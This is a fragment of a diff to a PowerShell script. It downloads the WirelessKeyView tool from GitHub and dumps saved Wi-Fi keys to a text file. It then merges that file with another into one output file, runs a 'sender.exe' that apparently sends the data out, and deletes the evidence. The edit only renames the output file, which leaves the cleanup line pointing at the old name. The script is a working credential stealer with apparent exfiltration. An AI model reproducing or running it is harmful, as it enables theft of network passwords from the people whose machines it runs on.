@@ -6,7 +6,7 @@ Invoke-WebRequest "https://github.com/kidarok/Nirsoft_Tools/blob/main/WirelessKe
 Start-Sleep 3
 .\WirelessKeyView.exe /stext f2.txt
 Start-Sleep 3
-Get-Content -Path f.txt, f2.txt > dane.txt
+Get-Content -Path f.txt, f2.txt > data.txt
 .\sender.exe
 Start-Sleep 5
 Remove-Item .\dane.txt
